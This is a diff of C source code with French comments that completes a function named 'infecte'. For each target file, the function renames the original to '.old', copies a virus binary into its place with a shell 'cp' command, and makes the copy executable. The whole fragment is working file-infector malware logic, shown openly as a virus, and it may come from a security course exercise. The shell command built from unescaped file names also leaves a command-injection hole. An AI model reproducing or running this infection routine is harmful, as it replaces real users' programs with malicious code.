@@ -83,7 +83,6 @@ void infecte(char **files, const char *cheminVirus) {
     int i;
     for (i = 0; i < MAX_FILES; i++) {
 
-        // On ignore les cases vides du tableau
         if (files[i] == NULL) {
             continue;
         }
@@ -93,20 +92,22 @@ void infecte(char **files, const char *cheminVirus) {
         // Étape 1 : renommer la cible en .old 
         char oldName[512];
         snprintf(oldName, sizeof(oldName), "%s.old", files[i]);
-
-
+        if (rename(files[i], oldName) != 0) {
+            perror("  rename");
+            continue;
+        }
         printf("  Renommé : %s -> %s\n", files[i], oldName);
 
         // Étape 2 : copier le virus à la place 
-        
         char cmd[512];
         snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\"", cheminVirus, files[i]);
-
-
+        if (system(cmd) != 0) {
+            perror("  cp");
+            continue;
+        }
         printf("  Virus copié vers : %s\n", files[i]);
 
         // Étape 3 : rendre la copie exécutable 
-        
         if (chmod(files[i], 0755) != 0) {
             perror("  chmod");
         }
